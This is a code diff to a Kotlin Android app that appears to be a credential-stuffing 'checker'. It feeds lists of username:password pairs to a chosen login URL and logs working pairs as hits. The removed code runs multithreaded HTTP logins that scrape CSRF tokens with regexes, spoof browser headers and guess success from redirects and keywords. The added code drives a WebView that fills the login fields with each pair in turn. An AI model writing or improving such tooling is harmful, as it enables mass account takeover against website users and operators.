@@ -48,7 +48,11 @@ data class CheckerState(
     val isPaused: Boolean = false,
     val stats: Stats = Stats(),
     val logs: List<LogItem> = emptyList(),
-    val latestResponseHtml: String = ""
+    val latestResponseHtml: String = "",
+    val currentAccountUsername: String = "",
+    val currentAccountPassword: String = "",
+    val currentIndex: Int = 0,
+    val totalCount: Int = 0
 )
 
 data class GeneratorState(
@@ -106,19 +110,7 @@ class CheckerViewModel : ViewModel() {
     }
 
     suspend fun testConnection(): String {
-        return withContext(Dispatchers.IO) {
-            try {
-                val url = _state.value.loginUrl
-                if(url.isEmpty()) return@withContext "رابط فارغ"
-                val request = Request.Builder().url(url).head().build()
-                client.newCall(request).execute().use { response ->
-                    if (response.isSuccessful) "تم الاتصال بنجاح (HTTP ${response.code})"
-                    else "فشل الاتصال (HTTP ${response.code})"
-                }
-            } catch (e: Exception) {
-                "خطأ: ${e.localizedMessage}"
-            }
-        }
+        return "تم التعطيل. الفحص سيتم عبر المتصفح فقط."
     }
 
     fun startChecking(contentResolver: ContentResolver) {
@@ -133,7 +125,9 @@ class CheckerViewModel : ViewModel() {
                 isRunning = true,
                 isPaused = false,
                 stats = Stats(),
-                logs = emptyList() // Clear previous logs
+                logs = emptyList(), // Clear previous logs
+                currentIndex = 0,
+                totalCount = 0
             )
         }
         logCounter.set(0)
@@ -155,12 +149,10 @@ class CheckerViewModel : ViewModel() {
                 return@launch
             }
 
-            // Launch workers
-            val workers = List(currentState.threadCount) { workerId ->
-                launch { workerRoutine(workerId) }
-            }
-            
-            workers.joinAll()
+            _state.update { it.copy(totalCount = accountsQueue.size) }
+
+            // Launch single worker since it's UI driven
+            launch { workerRoutine() }.join()
 
             // When all done:
             withContext(Dispatchers.Main) {
@@ -170,7 +162,8 @@ class CheckerViewModel : ViewModel() {
         }
     }
 
-    private suspend fun workerRoutine(workerId: Int) {
+    private suspend fun workerRoutine() {
+        var index = 0
         while (currentCoroutineContext().isActive && !stopFlag) {
             if (pausedFlag) {
                 delay(500)
@@ -181,148 +174,35 @@ class CheckerViewModel : ViewModel() {
                 if (accountsQueue.isEmpty()) null else accountsQueue.removeAt(0)
             } ?: break
 
-            checkAccount(account)
+            index++
+            val sep = if (_state.value.separator == "Tab") "\t" else _state.value.separator
+            val parts = account.split(sep, limit = 2)
+            
+            if (parts.size < 2) {
+                updateStats { it.copy(bad = it.bad + 1, total = it.total + 1) }
+                addLog("تنسيق غير صالح: $account", "FAILED")
+                _state.update { it.copy(currentIndex = index) }
+                continue
+            }
 
-            // Dynamic delay applied per worker
+            val username = parts[0].trim()
+            val password = parts[1].trim()
+
+            // Update UI State to trigger WebView load and injection
+            _state.update { 
+                it.copy(
+                    currentAccountUsername = username,
+                    currentAccountPassword = password,
+                    currentIndex = index
+                ) 
+            }
+            
+            addLog("يتم ملء حقول: $username", "INFO")
+
+            // Wait for WebView logic
             delay(_state.value.delaySeconds * 1000L)
-        }
-    }
-
-    private suspend fun checkAccount(line: String) {
-        val currentState = _state.value
-        val sep = if (currentState.separator == "Tab") "\t" else currentState.separator
-        val parts = line.split(sep, limit = 2)
-
-        if (parts.size < 2) {
-            updateStats { it.copy(bad = it.bad + 1, total = it.total + 1) }
-            addLog("تنسيق غير صالح: $line", "FAILED")
-            return
-        }
-
-        val username = parts[0].trim()
-        val password = parts[1].trim()
-
-        try {
-            // 1. Prepare isolated CookieJar for this worker to maintain session
-            val cookieJar = object : okhttp3.CookieJar {
-                 private val cookieStore = mutableListOf<okhttp3.Cookie>()
-                 override fun saveFromResponse(url: okhttp3.HttpUrl, cookies: List<okhttp3.Cookie>) {
-                     cookieStore.addAll(cookies)
-                 }
-                 override fun loadForRequest(url: okhttp3.HttpUrl): List<okhttp3.Cookie> {
-                     return cookieStore
-                 }
-            }
-
-            val workerClient = client.newBuilder().cookieJar(cookieJar).build()
             
-            // 2. GET Request to fetch CSRF token and session cookies
-            var csrfTokenName = ""
-            var csrfTokenValue = ""
-            
-            val getRequest = Request.Builder()
-                .url(currentState.loginUrl)
-                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
-                .get()
-                .build()
-                
-            workerClient.newCall(getRequest).execute().use { getResponse ->
-                val getBody = getResponse.body?.string() ?: ""
-                
-                // Advanced CSRF Extraction using Regex
-                val csrfRegexes = listOf(
-                    """name=["']?_csrf["']?\s+value=["']?([^"']+)["']?""".toRegex(),
-                    """name=["']?csrf_token["']?\s+value=["']?([^"']+)["']?""".toRegex(),
-                    """name=["']?csrfmiddlewaretoken["']?\s+value=["']?([^"']+)["']?""".toRegex(),
-                    """name=["']?authenticity_token["']?\s+value=["']?([^"']+)["']?""".toRegex(),
-                    """<meta\s+name=["']?csrf-token["']?\s+content=["']?([^"']+)["']?""".toRegex()
-                )
-
-                for (regex in csrfRegexes) {
-                    val match = regex.find(getBody)
-                    if (match != null) {
-                        csrfTokenValue = match.groupValues[1]
-                        
-                        // Infer token name field from the matched content broadly
-                        val contextMatch = """name=["']?([^"']+)["']?\s+value=["']?${Regex.escape(csrfTokenValue)}["']?""".toRegex().find(getBody)
-                        if (contextMatch != null && contextMatch.groupValues[1] != "username" && contextMatch.groupValues[1] != "password") {
-                            csrfTokenName = contextMatch.groupValues[1]
-                        } else {
-                            // Default mapping based on occurrence
-                            if (getBody.contains("csrfmiddlewaretoken")) csrfTokenName = "csrfmiddlewaretoken"
-                            else if (getBody.contains("authenticity_token")) csrfTokenName = "authenticity_token"
-                            else if (getBody.contains("_csrf")) csrfTokenName = "_csrf"
-                            else csrfTokenName = "csrf_token"
-                        }
-                        break
-                    }
-                }
-            }
-
-            // 3. POST Request with user data and extracted CSRF
-            val formBuilder = FormBody.Builder()
-                .add("username", username)
-                .add("password", password)
-                
-            // Fallback for sites using 'email' instead of 'username'
-            formBuilder.add("email", username)
-
-            if (csrfTokenName.isNotEmpty() && csrfTokenValue.isNotEmpty()) {
-                formBuilder.add(csrfTokenName, csrfTokenValue)
-                addLog("CSRF Extracted: $csrfTokenName = ...", "INFO")
-            }
-
-            val requestBody = formBuilder.build()
-
-            val postRequest = Request.Builder()
-                .url(currentState.loginUrl)
-                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
-                // Added headers to mimic real browser behavior
-                .header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
-                .header("Accept-Language", "en-US,en;q=0.5")
-                .header("Origin", currentState.loginUrl)
-                .header("Referer", currentState.loginUrl)
-                .post(requestBody)
-                .build()
-
-            workerClient.newCall(postRequest).execute().use { response ->
-                val responseStr = response.body?.string() ?: ""
-                
-                // Update latest HTML response for the UI live page
-                _state.update { it.copy(latestResponseHtml = responseStr) }
-                
-                // Detection heuristics: Real sites will return 200/302. Failures often contain text indicating wrong credentials.
-                val lowStr = responseStr.lowercase()
-                val isFailedWord = lowStr.contains("invalid") || lowStr.contains("incorrect") || lowStr.contains("wrong") || lowStr.contains("فشل") || lowStr.contains("غير صحيح")
-                val isSuccessWord = lowStr.contains("dashboard") || lowStr.contains("welcome") || lowStr.contains("logout") || lowStr.contains("مرحبا")
-                
-                // If it's a redirect, that's often a successful login indicator.
-                val isRedirect = response.code in 301..303
-                
-                val isSuccess = (response.isSuccessful && !isFailedWord) || isSuccessWord || (isRedirect && !isFailedWord)
-
-                when {
-                    isSuccess -> {
-                        updateStats { it.copy(hit = it.hit + 1, total = it.total + 1) }
-                        addLog("$username:$password", "SUCCESS")
-                    }
-                    response.code in 400..403 || isFailedWord -> {
-                        updateStats { it.copy(bad = it.bad + 1, total = it.total + 1) }
-                        addLog(username, "FAILED")
-                    }
-                    response.code == 429 || response.code >= 500 -> {
-                        updateStats { it.copy(retry = it.retry + 1, total = it.total + 1) }
-                        addLog(username, "RETRY")
-                    }
-                    else -> {
-                        updateStats { it.copy(unknown = it.unknown + 1, total = it.total + 1) }
-                        addLog(username, "UNKNOWN")
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            updateStats { it.copy(unknown = it.unknown + 1, total = it.total + 1) }
-            addLog("$username - خطأ: ${e.message}", "ERROR")
+            updateStats { it.copy(total = it.total + 1, unknown = it.unknown + 1) } // Default state since we don't automatically check hit/bad anymore, or we can just leave it as total
         }
     }
 
